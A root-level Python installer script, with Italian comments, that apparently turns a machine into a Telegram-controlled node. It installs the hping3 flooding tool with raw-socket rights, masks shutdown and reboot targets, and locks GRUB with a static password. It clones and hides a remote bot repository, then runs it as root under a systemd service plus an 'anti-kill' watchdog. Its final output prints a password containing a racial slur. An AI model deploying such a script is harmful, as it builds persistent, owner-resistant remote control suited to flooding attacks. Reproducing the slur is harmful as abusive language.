#!/usr/bin/env python3
import os
import sys
import subprocess

def run(cmd, fatal=False):
    print(f"[+] {cmd}")
    r = subprocess.run(cmd, shell=True)
    if fatal and r.returncode != 0:
        print("[!] ERRORE FATALE")
        sys.exit(1)

# =============================
# REQUIRE ROOT
# =============================
if os.geteuid() != 0:
    print("Devi eseguire questo script come root")
    sys.exit(1)

# =============================
# 1. Dipendenze
# =============================
run("apt update", fatal=True)
run(
    "apt install -y hping3 git curl build-essential libssl-dev zlib1g-dev "
    "libncurses5-dev libffi-dev libreadline-dev",
    fatal=True
)

# =============================
# 2. hping3 cap
# =============================
if os.path.exists("/usr/sbin/hping3"):
    run("setcap cap_net_raw+ep /usr/sbin/hping3")

# =============================
# 3. PATH root
# =============================
with open("/root/.bashrc", "a") as f:
    f.write("\nexport PATH=$PATH:/sbin:/usr/sbin\n")

# =============================
# 4. POWER / REBOOT / SUSPEND LOCK
# =============================
targets = [
    "ctrl-alt-del.target",
    "poweroff.target",
    "reboot.target",
    "suspend.target",
    "hibernate.target"
]
for t in targets:
    run(f"systemctl mask {t}")

# =============================
# 5. GRUB LOCK (HASH STATICO)
# =============================
GRUB_HASH = (
    "grub.pbkdf2.sha256.10000."
    "dbdd3588e030359bcf8e1efd4624d980."
    "fe2d4ac214cb672d98272c7db86e10acc91c0332502f8c04d4d7d55d8db967ee"
)

GRUB_CUSTOM = "/etc/grub.d/40_custom"

print("[+] Configurazione GRUB con hash statico")

with open(GRUB_CUSTOM, "w") as f:
    f.write(f"""set superusers="root"
password_pbkdf2 root {GRUB_HASH}
""")

run("update-grub", fatal=True)

# =============================
# 6. Python 3.10
# =============================
run(
    "cd /usr/src && curl -O https://www.python.org/ftp/python/3.10.14/Python-3.10.14.tgz",
    fatal=True
)
run("cd /usr/src && tar xzf Python-3.10.14.tgz", fatal=True)
run("cd /usr/src/Python-3.10.14 && ./configure --enable-optimizations", fatal=True)
run("cd /usr/src/Python-3.10.14 && make -j$(nproc)", fatal=True)
run("cd /usr/src/Python-3.10.14 && make altinstall", fatal=True)

# =============================
# 7. Bot
# =============================
run("/usr/local/bin/python3.10 -m ensurepip", fatal=True)
run("/usr/local/bin/python3.10 -m pip install --upgrade pip", fatal=True)
run("/usr/local/bin/python3.10 -m pip install python-telegram-bot==13.15", fatal=True)

run("cd /root && git clone https://github.com/troiarcazzoguardi-dev/bott.git")

if os.path.exists("/root/bott"):
    run("mv /root/bott /root/.bott")
    run("chmod 711 /root/.bott")

# =============================
# 8. BOT SYSTEMD SERVICE
# =============================
with open("/etc/systemd/system/bott.service", "w") as f:
    f.write("""[Unit]
Description=Telegram Bot
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/.bott
ExecStart=/usr/local/bin/python3.10 /root/.bott/bott.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
""")

run("systemctl daemon-reload")
run("systemctl enable bott")
run("systemctl start bott")

# =============================
# 9. WATCHDOG ANTI-KILL
# =============================
print("[+] Attivazione watchdog anti-kill")

with open("/etc/systemd/system/bott-watchdog.service", "w") as f:
    f.write("""[Unit]
Description=Bot Watchdog
After=bott.service

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do systemctl is-active --quiet bott || systemctl restart bott; sleep 10; done'
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
""")

run("systemctl daemon-reload")
run("systemctl enable bott-watchdog")
run("systemctl start bott-watchdog")

print("\n[✓] COMPLETATO CON SUCCESSO")
print("    - GRUB protetto (password: NIGGA YOU CAN'T)")
print("    - Bot attivo")
print("    - Watchdog anti-kill attivo")
